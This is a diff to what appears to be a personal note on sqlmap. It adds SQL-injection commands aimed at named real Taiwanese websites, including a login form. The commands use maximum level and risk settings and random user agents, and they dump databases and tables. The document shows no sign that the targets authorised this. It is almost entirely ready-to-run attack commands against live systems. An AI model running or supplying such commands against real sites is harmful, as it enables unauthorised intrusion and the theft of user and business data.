@@ -17,7 +17,16 @@ tags: a
 ```python=
 $ sqlmap -u https://www.secom.com.tw/news/detail.html?id=131 --force-ssl --dbms MySQL -v 3 --level 5 --risk 3 --dump MySQL --dbs
 $ sqlmap -u https://www.secom.com.tw/news/detail.html?id=131+AND+1%3D1+--+
+
+$ sqlmap -u https://www.caco.com.tw/security/memberidentify/login --data="id=ddf,password=1aabac6d068eef6a7bad3fdf50a05cc8" --param-del="," -p "id,password" -T4 -v3 --level 5 --risk 3
 ```
+指定參數
+```
+$ sqlmap -u https://www.caco.com.tw/security/memberidentify/login --data="id=ddf,password=1aabac6d068eef6a7bad3fdf50a05cc8" --param-del="," -p "id,password" -T4 -v3 --level 5 --risk 3 --random-agent --current-db --dump --dbs --tables
+```
+
+
+123
 ---
 # [[sqlmap note]]
 
